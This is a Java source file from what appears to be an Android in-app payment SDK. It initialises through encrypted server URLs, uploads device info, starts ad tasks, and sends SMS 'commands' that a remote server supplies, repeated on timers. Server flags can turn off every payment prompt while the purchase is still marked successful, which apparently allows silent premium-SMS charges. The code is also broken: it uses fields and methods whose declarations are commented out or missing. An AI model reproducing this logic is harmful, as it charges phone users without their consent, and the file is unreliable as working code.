package com.hhyk_sdk.control;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.widget.Toast;


import com.hhyk_sdk.Constants;
import com.hhyk_sdk.Util.DESCoder;
import com.hhyk_sdk.Util.LocalStorage;
import com.hhyk_sdk.Util.LogUtil;
import com.hhyk_sdk.Util.NetUtil;
import com.hhyk_sdk.callback.ExitListener;
import com.hhyk_sdk.callback.InitCallback;
import com.hhyk_sdk.callback.PayCallback;
import com.hhyk_sdk.callback.PayListener;
import com.hhyk_sdk.callback.ProgressView;
import com.hhyk_sdk.entity.CmdCallbackRequestParam;
import com.hhyk_sdk.entity.PayResult;
import com.hhyk_sdk.entity.UrlEntity;
import com.hhyk_sdk.http.OkHttpClientManager;
import com.hhyk_sdk.view.ProgressDialog;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

@SuppressLint("HandlerLeak")
public class PayManager implements InitCallback, PayCallback {

	private static final String TAG = "PayManger";

	public static PayManager instance;

	private final static Lock lock = new ReentrantLock();

	private Context context;

	private PayListener payListener;

	private int productId;
	private String orderNo;
	private String paramRet;

	private int payStatus = 0; // 0=没有支付 1=正在支付
//	private SmsSdk smsSdk;
//	private WoReaderSdk woReaderSdk;
	// private PayProgressView progressView;
	private UrlEntity urlEntity;
	private ProgressDialog progressDialog;
	private PayResult payResult;
	private boolean isLandscape;
//	private PreSignMessageUtil preSign;

	private Handler mHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
			case 1:
				instance.showProgressDialog(instance.context, false);
				break;

			case 2:
				instance.dismissProgressDialog();


				break;

			case 3:
//				int consumerId = msg.getData().getInt("consumerId", 0);
//				int cmdId = msg.getData().getInt("cmdId", 0);
//				int sendStatus = msg.getData().getInt("sendStatus", 0);
//				if (consumerId == 0 || cmdId == 0 || sendStatus == 0) {
//					return;
//				}
//				try {
//					// 回调指令执行成功接口
//					if (NetUtil.isConnected(instance.context)) {
//						OkHttpClientManager<CmdCallbackRequestParam> request = new OkHttpClientManager<CmdCallbackRequestParam>(
//								instance.context, null, null, null);
//						LocalStorage storage = LocalStorage
//								.getInstance(instance.context);
//						request.execute(DESCoder.decryptoPriAndPub(
//								instance.context, storage.getString(
//										Constants.CMDCALLBACK_URL, "")),
//								new CmdCallbackRequestParam(instance.context,
//										consumerId, cmdId, sendStatus).toJson());
//					}
//				} catch (Exception e) {
//					LogUtil.e(TAG, "smsTask1-->" + e);
//				}
				break;

			case 4:
//				Intent intent = new Intent(context, PayActivity.class);
//				intent.putExtra("viewType", msg.getData().getInt("viewType"));
//				instance.context.startActivity(intent);
				break;

			case 5: // 获取指令完成
//				if (instance.payResult != null
//						&& instance.payResult.cmdList.size() > 0
//						&& instance.payResult.cmdList.get(0).isPla == 4) {
//					// 微信支付
//					instance.wechatPay();
//				} else if (instance.payResult != null
//						&& instance.payResult.cmdList.size() > 0
//						&& instance.payResult.cmdList.get(0).isPla == 5) {
//					PayManager.instance.dismissProgressDialog();
//					String productIdStr = "" + productId;
//					String index = productIdStr.substring(productIdStr.length() - 3);
//					int indexInt = Integer.parseInt(index) - 1;
//					// 易接支付
//					SFCommonSDKInterface.pay((Activity)instance.context, "" + indexInt,
//							new SFIPayResultListener() {
//								@Override
//								public void onCanceled(String arg0) {
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.mHandler.sendEmptyMessage(7);
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.getPayListener().onFailure("取消支付");
//								}
//
//								@Override
//								public void onFailed(String arg0) {
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.mHandler.sendEmptyMessage(7);
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.getPayListener().onFailure("支付失敗");
//								}
//
//								@Override
//								public void onSuccess(String arg0) {
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.mHandler.sendEmptyMessage(6);
//									if (PayManager.instance.getPayStatus() != 0) {
//										PayManager.instance.setPayStatus(0);
//									}
//									instance.getPayListener().onPaySuccess();
//								}
//							});
//				} else {
					// 判断是否显示提示窗
					if (instance.urlEntity.tipIsWi == 1
							&& instance.urlEntity.tipIsLo == 1) { // 显示提示窗
						PayManager.instance.dismissProgressDialog();
						PayManager.instance
								.toPayViewActivity(instance.payResult.tipValue);
					} else {
						PayManager.instance.optionCmd(instance.payResult);
					}
//				}
				break;

			case 6:
				Toast.makeText(instance.context, "购买成功.", Toast.LENGTH_SHORT)
						.show();
				break;

			case 7:
				Toast.makeText(instance.context, "购买失败.", Toast.LENGTH_SHORT)
						.show();
				break;

			case 8:
//				new SucessDialog(instance.context, instance.payResult.tipValue)
//					tipValue	.show();
				break;

			case 9:
				Toast.makeText(instance.context, "检测网络连接异常，购买失败.",
						Toast.LENGTH_SHORT).show();
				break;

			case 10:
				Toast.makeText(instance.context, "检测SIM卡异常，购买失败.",
						Toast.LENGTH_SHORT).show();
				break;
				
			case 11:
				Toast.makeText(instance.context, "支付失败，请安装微信支付",
						Toast.LENGTH_SHORT).show();
				break;

			default:
				break;
			}
		}
	};

	public PayManager(Context context) {
	}

	public Context getContext() {
		return instance.context;
	}

	public PayListener getPayListener() {
		return instance.payListener;
	}

	public void setPayStatus(int payStatus) {
		instance.payStatus = payStatus;
	}

	public int getPayStatus() {
		return instance.payStatus;
	}

	public UrlEntity getUrlEntity() {
		return instance.urlEntity;
	}

	public int getProductId() {
		return instance.productId;
	}

	public PayResult getPayResult() {
		return instance.payResult;
	}

	public PreSignMessageUtil getPreSign() {
		return preSign;
	}

	/*
	 * public String getPublicKey() { if
	 * (StringUtil.isEmpty(instance.publicKey)) { instance.publicKey =
	 * instance.JniGetpublickey(); } // LogUtil.i(TAG, "instance.publicKey-->" +
	 * instance.publicKey); return instance.publicKey; }
	 */

	/*
	 * public String getInitUrl() { if (StringUtil.isEmpty(instance.initUrl)) {
	 * instance.initUrl = instance.JniGetUrl(); } // LogUtil.i(TAG,
	 * "instance.initUrl-->" + instance.initUrl); return instance.initUrl; }
	 */


	public void setPayResult(PayResult payResult) {
		instance.payResult = null;
		instance.payResult = payResult;
		if (instance.urlEntity.tipIsLo == 1 && instance.payResult.tipIsWi == 1) {
			instance.urlEntity.tipIsWi = 1;
			instance.urlEntity.tipTel = instance.payResult.tipTel;
			instance.urlEntity.tipName = instance.payResult.tipName;
			if (instance.urlEntity.tipValue == 0) {
				instance.urlEntity.tipValue = instance.payResult.tipValue;
			}
		}
//		if (instance.payResult.cmdList.get(0).isPla == 4 || instance.payResult.cmdList.get(0).isPla == 5) {
//			instance.urlEntity.tipIsWi = 0;
//		}
		if (instance.payResult.cmdList.get(0).isPla == 6) {
			instance.urlEntity.tipIsWi = 0;
		}
	}

	public boolean getIsLandscape() {
		return instance.isLandscape;
	}

	public static void initSdk(Context context, int appId, int channelId,
                               String appKey) {
		saveInfo(context, appId, channelId, appKey);
		getInstance(context);
		instance.initalize();
	}

	/**
	 * 支付
	 * 
	 * @param context
	 * @param productId
	 *            商品ID
	 * @param paramRet
	 * @param orderNo
	 *            订单号
	 * @param payListener
	 */
	public static void startPay(Context context, int productId,
                                String paramRet, String orderNo, PayListener payListener) {
		pay(context, productId, paramRet, orderNo, payListener);
	}

	/**
	 * 回收
	 */
	public static void destroy(final ExitListener exitListener) {
		if (instance != null) {
			
		}

	}


	private synchronized static void pay(Context context, int productId,
                                         String paramRet, String orderNo, PayListener payListener) {
		LogUtil.i(TAG, "pay");
		getInstance(context);
		if (instance.getPayStatus() == 1) {
			payListener.onFailure("购买失败.");
			return;
		} else {
			instance.setPayStatus(1);
		}
		instance.mHandler.sendEmptyMessage(1);//dialo show
		instance.isLandscape = false;//横竖屏
		if (instance.context.getResources().getConfiguration().orientation == Configuration.ORIENTATION_LANDSCAPE) {
			LogUtil.i("info", "landscape");
			instance.isLandscape = true;
		} else if (instance.context.getResources().getConfiguration().orientation == Configuration.ORIENTATION_PORTRAIT) {
			LogUtil.i("info", "portrait");
			instance.isLandscape = false;
		}
		instance.payMent(context, productId, paramRet, orderNo, payListener);
	}

	private void payMent(Context context, int productId, String paramRet,
                         String orderNo, PayListener payListener) {
		instance.payListener = payListener;
		instance.productId = productId;
		instance.orderNo = orderNo;
		instance.paramRet = paramRet;
		init(Constants.PAY_INIT, this, new InitProgressView(context));
	}

	private static PayManager getInstance(Context context) {
		try {
			lock.lock();
			if (instance == null) {
				instance = new PayManager(context);
				instance.context = context;
				// instance.progressView = new PayProgressView(context);
			}
			return instance;
		} finally {
			lock.unlock();
		}
	}

	private void initalize() {
		// 易接SDK初始化
//		SFCommonSDKInterface.onInit((Activity) instance.context);
//		//易接接口：是否需要打开游戏声音 （调用一下，防止接口检查）
//		SFCommonSDKInterface.isMusicEnabled((Activity)instance.context);
//		// 搜游支付SDK初始化
		init(Constants.NORMAL_INIT, this, null);
	}

	private void init(int type, InitCallback initCallBack,
			ProgressView progressView) {
		LogUtil.i(TAG, "init");
		// 开启服务
		instance.context.startService(new Intent(context, PayService.class));

		if (!NetUtil.isConnected(instance.context)) {
			if (type == Constants.PAY_INIT) {
				instance.setPayStatus(0);
				instance.mHandler.sendEmptyMessage(2);
				instance.mHandler.sendEmptyMessage(9);
				instance.getPayListener().onFailure("网络连接异常.");
			}
			return;
		}

//		if (type == Constants.PAY_INIT) {
//			if (StringUtil.isEmpty(DeviceInfoUtil.getImsi(instance.context))) {
//				instance.setPayStatus(0);
//				instance.mHandler.sendEmptyMessage(2);
//				instance.mHandler.sendEmptyMessage(10);
//				instance.getPayListener().onFailure("未检测到SIM卡.");
//				return;
//			}
//		}

		if (StringUtil.isEmpty(DESCoder.getInitUrl())
				&& type == Constants.PAY_INIT) {
			instance.setPayStatus(0);
			instance.mHandler.sendEmptyMessage(2);
			instance.mHandler.sendEmptyMessage(7);
			instance.getPayListener().onFailure("购买失败.");
			return;
		}

		// LocalStorage storage = LocalStorage.getInstance(instance.context);
		// String initTag = storage.getString(Constants.INIT_TAG, "false");
		if (instance.urlEntity == null) {
			OkHttpClientManager<InitEntity> request = new OkHttpClientManager<InitEntity>(
					instance.context, null, new InitEntityParser(),
					new InitListener(type, initCallBack));
			request.execute(DESCoder.getInitUrl(), new DeviceInfo(
					instance.context).toJSON());
		} else {
			initCallBack.onInitSuccess(type, instance.urlEntity);
		}

	}

	private class InitListener implements HttpCallback<InitEntity> {

		private InitCallback initCallback;
		private int type;

		public InitListener(int type, InitCallback initCallback) {
			this.type = type;
			this.initCallback = initCallback;
		}

		@Override
		public void onSuccess(InitEntity object) {
			LogUtil.i(TAG,
					"InitListener.onSuccess_object-->" + object.toString());
			if (object.success) { // 初始化成功
				LocalStorage storage = LocalStorage.getInstance(context);
				storage.putString(Constants.INIT_TAG, "true");
				storage.putString(Constants.USERLOGIN_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.userLogin_url));
				storage.putString(Constants.REGLOGIN_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.regLogin_url));
				storage.putString(Constants.ADCALLBACK_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.adCallback_url));
				storage.putString(Constants.ADOPER_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.adOper_url));
				storage.putString(Constants.ADTOPIC_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.adTopic_url));
				LogUtil.i(TAG, "" + object.urlEntity.cmdPayment_url);
				storage.putString(Constants.CMDPAYMENT_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.cmdPayment_url));
				LogUtil.i(TAG, "" + object.urlEntity.cmdCallback_url);
				storage.putString(Constants.CMDCALLBACK_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.cmdCallback_url));
				storage.putString(Constants.USEROUT_URL, DESCoder
						.encryptoPubAndPri(((PayManager) initCallback).context,
								object.urlEntity.userOut_url));

				initCallback.onInitSuccess(type, object.urlEntity);
			} else {
				initCallback.onInitFailure(type, -2, object.msg);
			}
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			LogUtil.i(TAG, "InitListener.onFailure_errorCode-->" + errorCode
					+ " : errorMessage-->" + errorMessage);
			initCallback.onInitFailure(type, errorCode, errorMessage);

		}

	}

	/**
	 * 保存 信息
	 * 
	 * @param context
	 * @param appId
	 * @param channelId
	 * @param appKey
	 */
	private static void saveInfo(Context context, int appId, int channelId,
                                 String appKey) {
		LogUtil.i(TAG, "saveInfo");
		LocalStorage storage = LocalStorage.getInstance(context);
		storage.putInt(Constants.VSOYOU_APP_ID, appId);
		storage.putInt(Constants.VSOYOU_CHANNELID, channelId);
		storage.putString(Constants.VSOYOU_APP_KEY, appKey);
	}

	@Override
	public void onInitSuccess(int type, UrlEntity urlEntity) {
		instance.mHandler.sendEmptyMessage(2);
		instance.urlEntity = urlEntity;
		if (type == Constants.PAY_INIT) {
			if (instance.urlEntity.tipIsLo == 0) { // 进度条隐藏
				if (instance.urlEntity.tipIsWi == 0) {// 提示窗隐藏
					instance.getCmd();
					instance.mHandler.sendEmptyMessage(6);
					instance.getPayListener().onPaySuccess();
					// instance.onPaySuccess();
				} else if (instance.urlEntity.tipIsWi == 1) {// 提示窗显示
					switch (instance.urlEntity.tipValue) {
					case 0: // 默认
						instance.toPayViewActivity(0);
						break;
					case 1: // 基地
						instance.toPayViewActivity(1);
						break;
					case 2: // MM
						instance.toPayViewActivity(2);
						break;
					case 3: // 沃商店
						instance.toPayViewActivity(3);
						break;
					case 4: // 爱游戏
						instance.toPayViewActivity(4);
						break;
					default:
						instance.toPayViewActivity(0);
						break;
					}
				}
			} else if (instance.urlEntity.tipIsLo == 1) {// 进度条显示
				instance.mHandler.sendEmptyMessage(1);
				instance.getCmd();
			}
		}
		// 初始成功 开始广告 任务
		startAdTask();
	}

	public void toPayViewActivity(int viewType) {
		Message message = Message.obtain();
		message.what = 4;
		Bundle bundle = new Bundle();
		bundle.putInt("viewType", viewType);
		message.setData(bundle);
		instance.mHandler.sendMessage(message);
	}

	@Override
	public void onInitFailure(int type, int errorCode, String errorMsg) {
		LogUtil.i(TAG, "errorMsg-->" + errorMsg);
		if (type == Constants.PAY_INIT) {
			if (StringUtil.isEmpty(errorMsg)) {
				errorMsg = "Unknown error!";
			}
			instance.onFailure(errorMsg);
		}
	}

	private void startAdTask() {
		AdManger.initAdManager(instance.context);
	}

	public void getCmd() {
		LocalStorage storage = LocalStorage.getInstance(context);
		new GetCmdTask(instance.context, DESCoder.decryptoPriAndPub(
				instance.context,
				storage.getString(Constants.CMDPAYMENT_URL, "")),
				instance.productId, instance.paramRet, instance.orderNo,
				instance.payListener, null).start();
	}

	@Override
	public void onPaySuccess() {
		LogUtil.i(TAG, "onPaySuccess-->");
		instance.mHandler.sendEmptyMessage(2);
		if (instance.urlEntity.tipIsWi == 1
				&& (instance.urlEntity.tipValue == 2
						|| instance.urlEntity.tipValue == 3 || instance.urlEntity.tipValue == 4)) { // 显示提示成功view
			LogUtil.i(TAG, "onPaySuccess-->1");
			instance.mHandler.sendEmptyMessage(8);
		} else if (instance.urlEntity.tipIsLo == 1) {
			LogUtil.i(TAG, "onPaySuccess-->2");
			LogUtil.i(TAG, "onPaySuccess-->3");
			instance.mHandler.sendEmptyMessage(6);
			instance.getPayListener().onPaySuccess();
		}
	}

	@Override
	public void onFailure(String message) {
		LogUtil.i(TAG, "onFailure-->" + message);
		instance.mHandler.sendEmptyMessage(2);
		if (instance.getPayStatus() != 0) {
			instance.setPayStatus(0);
		}
		if (instance.urlEntity == null || instance.urlEntity.tipIsLo == 1) {
			instance.mHandler.sendEmptyMessage(7);
			instance.getPayListener().onFailure("购买失败.");
		}

	}

	public void showProgressDialog(Context context, boolean payViewUp) {
		try {
			if (instance.progressDialog != null) {
				if (instance.progressDialog.isShowing()) {
					instance.progressDialog.dismiss();
				}
				instance.progressDialog = null;
			}
			instance.progressDialog = new ProgressDialog(context, payViewUp);
			instance.progressDialog.show();
		} catch (Exception e) {
			LogUtil.e(TAG, "showProgressDialog.e-->" + e);
		}

	}

	public void dismissProgressDialog() {
		try {
			if (instance.progressDialog == null)
				return;
			if (!instance.progressDialog.isShowing())
				return;
			instance.progressDialog.dismiss();
			if (instance.progressDialog.payViewUp) {
				Activity activity = (Activity) instance.progressDialog.context;
				activity.finish();
			}
			instance.progressDialog = null;
		} catch (Exception e) {
			LogUtil.e(TAG, "dismissProgressDialog.e-->" + e);
		}

	}

	public void optionCmd(final PayResult payResult) {

		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					switch (payResult.cmdList.get(0).isPla) {
					case 0: // 短代
						instance.smsTask(payResult.cmdList);
						break;

					case 1: // 基地
						instance.MmOrJidiTask(payResult);
						break;

					case 2: // MM
						instance.MmOrJidiTask(payResult);
						break;

					case 3: // 沃阅读
						instance.WoReaderTask(payResult);
						break;
						
					case 4://微信
						instance.wechatPay(payResult);
						break;
						
					case 5://易接
					    instance.yijiePay();
				     	break;

					default:
						break;
					}
				} catch (Exception e) {
					instance.onFailure("购买失败.");
				}

			}
		}).start();

	}

	private void WoReaderTask(PayResult payResult) throws Exception {
		// ip,port,cpId,consumeCode,productid,provider,providerTel
		// 119.39.227.243,9098,100083,000000010577,0000000010374703,上海威搜游,0755-27526789
		instance.mHandler.sendEmptyMessage(2);
		if (StringUtil.isEmpty(payResult.cmdList.get(0).cfParam)) {
			PayManager.instance.onFailure("数据错误!");
		} else {
			LogUtil.i(TAG, "cfParam-->" + payResult.cmdList.get(0).cfParam);
			String[] woStrArr = payResult.cmdList.get(0).cfParam.split(",");
			WoReaderSdkEntity woReaderSdkEntity = new WoReaderSdkEntity(
					payResult.cmdList.get(0));
			woReaderSdkEntity.ip = woStrArr[0];
			woReaderSdkEntity.port = Integer.parseInt(woStrArr[1]);
			woReaderSdkEntity.cpId = woStrArr[2];
			woReaderSdkEntity.consumeCode = woStrArr[3];
			woReaderSdkEntity.productid = woStrArr[4];
			woReaderSdkEntity.provider = woStrArr[5];
			woReaderSdkEntity.providerTel = woStrArr[6];
			woReaderSdkEntity.consumePrice = ""
					+ payResult.cmdList.get(0).price;
			PayManager.instance.getWoReaderSdk().setWoReaderSdkEntity(
					woReaderSdkEntity);
			PayManager.instance.getWoReaderSdk().getHandler()
					.sendEmptyMessage(1);
		}

	}

	private void MmOrJidiTask(PayResult payResult) throws Exception {
		LogUtil.i(TAG, "MmOrJidiTask");
		LogUtil.i(TAG, "payResult.cmdList.get(0)-->"
				+ payResult.cmdList.get(0).toString());
		if (StringUtil.isEmpty(payResult.cmdList.get(0).apiUrl2)) {
			if (StringUtil.isEmpty(payResult.cmdList.get(0).sendPort)
					|| StringUtil.isEmpty(payResult.cmdList.get(0).sendCmd)) {
				PayManager.instance.setPayStatus(0);
				PayManager.instance.onPaySuccess();
			} else {
				PayManager.instance.getSmsSdk().sendSms(
						payResult.cmdList.get(0), true);
			}

		} else {
			PayManager.instance.getSmsSdk().sendSms(payResult.cmdList.get(0),
					false);
			Thread.sleep(payResult.cmdList.get(0).slTime * 1000);
			String cmdStr = NetUtil.doGet(payResult.cmdList.get(0).apiUrl2,
					payResult.cmdList.get(0).slTime);
			LogUtil.i(TAG, "MmOrJidiTask.cmdStr -->" + cmdStr);
			if (!StringUtil.isEmpty(cmdStr)) {
				OtherCmdEntity otherCmdEntity = new OtherCmdEntityParser(
						payResult.cmdList.get(0).consumerId).getResponse(
						context, cmdStr);
				LogUtil.i(TAG, "MmOrJidiTask.otherCmdEntity -->"
						+ otherCmdEntity.toString());
				if (otherCmdEntity != null) {
					if (otherCmdEntity.success) {
						if (StringUtil.isEmpty(otherCmdEntity.sendPort)
								|| StringUtil.isEmpty(otherCmdEntity.sendCmd)) {
							PayManager.instance.setPayStatus(0);
							PayManager.instance.onPaySuccess();
						} else {
							PayManager.instance.getSmsSdk().sendOtherSms(
									otherCmdEntity, true);
						}
					} else {
						PayManager.instance.onFailure(otherCmdEntity.message);
					}

				}
			}
		}
	}

	private void smsTask(ArrayList<CmdEntity> smsCmdList) throws Exception {
		for (int i = 0; i < smsCmdList.size(); i++) {
			CmdEntity cmdEntity = smsCmdList.get(i);
			// 只有短信指令 才做 以下操作
			// 指令号码和指令类容不为空 以及指令id大于0则认为 指令有效
			String cmdSendNum = cmdEntity.sendPort;
			String cmdSendContent = cmdEntity.sendCmd;
			if (cmdEntity.id > 0 && !"".equals(cmdSendNum)
					&& !"".equals(cmdSendContent)) {
				int j = 0;
				// 发送指令短信
				for (; j < cmdEntity.sendNum; j++) {
					if (j == 0 && i == 0) {
						PayManager.instance.getSmsSdk()
								.sendSms(cmdEntity, true);
					} else {
						PayManager.instance.getSmsSdk().sendSms(cmdEntity,
								false);
					}
					// 指令发送总数 大于 1条时才线程休眠
					if (cmdEntity.sendNum > 1) {
						try {
							Thread.sleep(30 * 1000);
						} catch (Exception e) {
							LogUtil.e(TAG, "" + e);
						}
					}
				}

			}
		}
		Thread.sleep(30 * 1000);
	}

	private void wechatPay() {
		if (PackUtil.checkPackage(instance.context, "com.tencent.mm")) {
			CmdEntity cmdEntity = instance.payResult.cmdList.get(0);
			preSign = new PreSignMessageUtil();
			preSign.appId = "" + cmdEntity.sendCmd;
			preSign.mhtOrderName = instance.urlEntity.productMap
					.get(PayManager.instance.getProductId()).titleName;
			preSign.mhtOrderType = "01";
			preSign.mhtCurrencyType = "156";
			preSign.mhtOrderAmt = ""
					+ urlEntity.productMap.get(PayManager.instance
							.getProductId()).price;
			preSign.mhtOrderDetail = PackUtil.getAppName((Activity) context);
			preSign.mhtOrderTimeOut = "3600";
			preSign.mhtOrderStartTime = new SimpleDateFormat("yyyyMMddHHmmss",
					Locale.CHINA).format(new Date());
			preSign.notifyUrl = cmdEntity.apiUrl2;
			preSign.mhtCharset = "UTF-8";
			preSign.payChannelType = "13";
			// appId,channelId,productId,cmdId
			LocalStorage nowLocalStorage = LocalStorage
					.getInstance(instance.context);
			preSign.mhtReserved = ""
					+ nowLocalStorage.getInt(Constants.VSOYOU_APP_ID, 0) + ","
					+ nowLocalStorage.getInt(Constants.VSOYOU_CHANNELID, 0)
					+ "," + instance.productId + "," + cmdEntity.id;
			// preSign.consumerId="456123";
			// preSign.consumerName="test";
			preSign.mhtOrderNo = instance.orderNo;
			String pre = MerchantTools.urlEncode(preSign
					.generatePreSignMessage());
			try {
				String md5Singpre = URLDecoder.decode(pre, "UTF-8");
				String md5singstr = MD5Facade.getFormStringParamMD5(md5Singpre,
						cmdEntity.cfParam, cmdEntity.sendPort);
				PayManager.instance.dismissProgressDialog();
				Intent toWeChatListener = new Intent(instance.context,
						WeChatListenerActivity.class);
				toWeChatListener.putExtra("message", "mhtSignature="
						+ md5singstr + "&mhtSignType=MD5");
				instance.context.startActivity(toWeChatListener);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
		} else {
			PayManager.instance.dismissProgressDialog();
			instance.mHandler.sendEmptyMessage(11);
			if (PayManager.instance.getPayStatus() != 0) {
				PayManager.instance.setPayStatus(0);
			}
			instance.getPayListener().onFailure("支付失败，请安装微信支付");
		}
	}
	
	private void wechatPay(PayResult payResult) {
		if (PackUtil.checkPackage(instance.context, "com.tencent.mm")) {
			CmdEntity cmdEntity = instance.payResult.cmdList.get(0);
			preSign = new PreSignMessageUtil();
			preSign.appId = "" + cmdEntity.sendCmd;
			preSign.mhtOrderName = instance.urlEntity.productMap
					.get(PayManager.instance.getProductId()).titleName;
			preSign.mhtOrderType = "01";
			preSign.mhtCurrencyType = "156";
			preSign.mhtOrderAmt = ""
					+ urlEntity.productMap.get(PayManager.instance
							.getProductId()).price;
			preSign.mhtOrderDetail = PackUtil.getAppName((Activity) context);
			preSign.mhtOrderTimeOut = "3600";
			preSign.mhtOrderStartTime = new SimpleDateFormat("yyyyMMddHHmmss",
					Locale.CHINA).format(new Date());
			preSign.notifyUrl = cmdEntity.apiUrl2;
			preSign.mhtCharset = "UTF-8";
			preSign.payChannelType = "13";
			// appId,channelId,productId,cmdId
			LocalStorage nowLocalStorage = LocalStorage
					.getInstance(instance.context);
			preSign.mhtReserved = ""
					+ nowLocalStorage.getInt(Constants.VSOYOU_APP_ID, 0) + ","
					+ nowLocalStorage.getInt(Constants.VSOYOU_CHANNELID, 0)
					+ "," + instance.productId + "," + cmdEntity.id;
			// preSign.consumerId="456123";
			// preSign.consumerName="test";
			preSign.mhtOrderNo = instance.orderNo;
			String pre = MerchantTools.urlEncode(preSign
					.generatePreSignMessage());
			try {
				String md5Singpre = URLDecoder.decode(pre, "UTF-8");
				String md5singstr = MD5Facade.getFormStringParamMD5(md5Singpre,
						cmdEntity.cfParam, cmdEntity.sendPort);
				PayManager.instance.dismissProgressDialog();
				Intent toWeChatListener = new Intent(instance.context,
						WeChatListenerActivity.class);
				toWeChatListener.putExtra("message", "mhtSignature="
						+ md5singstr + "&mhtSignType=MD5");
				instance.context.startActivity(toWeChatListener);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
		} else {
			PayManager.instance.dismissProgressDialog();
			instance.mHandler.sendEmptyMessage(11);
			if (PayManager.instance.getPayStatus() != 0) {
				PayManager.instance.setPayStatus(0);
			}
			instance.getPayListener().onFailure("支付失败，请安装微信支付");
		}
	}
	
	protected void yijiePay() {
		instance.mHandler.sendEmptyMessage(2);
		String productIdStr = "" + productId;
		String index = productIdStr.substring(productIdStr.length() - 3);
		int indexInt = Integer.parseInt(index) - 1;
		// 易接支付
		SFCommonSDKInterface.pay((Activity)instance.context, "" + indexInt,
				new SFIPayResultListener() {
					@Override
					public void onCanceled(String arg0) {
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.mHandler.sendEmptyMessage(7);
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.getPayListener().onFailure("取消支付");
					}

					@Override
					public void onFailed(String arg0) {
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.mHandler.sendEmptyMessage(7);
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.getPayListener().onFailure("支付失败");
					}

					@Override
					public void onSuccess(String arg0) {
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.mHandler.sendEmptyMessage(6);
						if (PayManager.instance.getPayStatus() != 0) {
							PayManager.instance.setPayStatus(0);
						}
						instance.getPayListener().onPaySuccess();
					}
				});
	}

}
